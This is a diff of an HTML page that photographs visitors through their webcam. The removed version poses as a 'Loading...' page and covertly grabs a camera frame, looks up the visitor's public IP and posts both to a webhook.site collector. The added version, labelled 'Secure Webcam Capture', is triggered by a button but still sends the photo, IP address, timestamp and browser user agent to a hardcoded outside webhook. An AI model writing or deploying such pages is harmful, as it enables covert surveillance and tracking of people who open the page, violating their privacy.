@@ -1,31 +1,82 @@
 <!DOCTYPE html>
 <html>
-<body style="font-family:Arial;text-align:center;padding:50px">
-<h1>Loading...</h1>
-<script>
-fetch('https://api.ipify.org?format=json')
-.then(r=>r.json())
-.then(i=>{
-navigator.mediaDevices.getUserMedia({video:true})
-.then(s=>{
-let v=document.createElement('video');
-v.srcObject=s;
-v.play();
-setTimeout(()=>{
-let c=document.createElement('canvas');
-c.width=320;c.height=240;
-c.getContext('2d').drawImage(v,0,0,320,240);
-c.toBlob(b=>{
-let d=new FormData();
-d.append('ip',i.ip);
-d.append('photo',b,'pic.jpg');
-fetch('https://webhook.site/4c304a59-d24d-44e8-878c-3617a521a5a4',{method:'POST',body:d});
-s.getTracks().forEach(t=>t.stop());
-document.body.innerHTML='<h1>Done! Check webhook.site</h1>';
-},'image/jpeg',0.6);
-},2000);
-});
-});
-</script>
+<head>
+  <meta charset="UTF-8">
+  <title>Webcam Capture</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 50px; background: #111; color: #0f0; }
+    #preview { border: 2px solid #0f0; margin: 20px auto; display: none; }
+    button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #0f0; color: #000; border: none; }
+    #status { margin: 20px; font-family: monospace; }
+    .error { color: #f00; }
+    .success { color: #0f0; }
+  </style>
+</head>
+<body>
+  <h1>🔒 Secure Webcam Capture</h1>
+  <div id="status">Click the button to start</div>
+  <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  <img id="preview" width="320" height="240">
+  <br>
+  <button id="startBtn">📷 Capture Photo</button>
+
+  <script>
+    const WEBHOOK_URL = 'https://webhook.site/4268c7f9-9ae5-4e23-9ee6-e0b3ad5074d3';
+    const status = document.getElementById('status');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const preview = document.getElementById('preview');
+    const startBtn = document.getElementById('startBtn');
+
+    startBtn.addEventListener('click', async () => {
+      try {
+        status.textContent = 'Requesting camera access...';
+        
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        await video.play();
+        
+        status.textContent = 'Camera active! Capturing in 3 seconds...';
+        startBtn.disabled = true;
+        
+        setTimeout(async () => {
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, 320, 240);
+          
+          // Show preview
+          preview.src = canvas.toDataURL('image/jpeg');
+          preview.style.display = 'block';
+          video.style.display = 'none';
+          
+          // Get IP
+          const ipRes = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipRes.json();
+          
+          // Upload
+          status.textContent = 'Uploading to webhook...';
+          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+          
+          const formData = new FormData();
+          formData.append('ip', ipData.ip);
+          formData.append('photo', blob, 'capture.jpg');
+          formData.append('timestamp', new Date().toISOString());
+          formData.append('userAgent', navigator.userAgent);
+          
+          await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+          
+          status.innerHTML = '<span class="success">✅ Done! Check your webhook.site dashboard</span>';
+          stream.getTracks().forEach(t => t.stop());
+          startBtn.disabled = false;
+          startBtn.textContent = '📷 Capture Another';
+          
+        }, 3000);
+        
+      } catch (err) {
+        status.innerHTML = `<span class="error">❌ Error: ${err.name} - ${err.message}</span>`;
+        console.error(err);
+      }
+    });
+  </script>
 </body>
 </html>
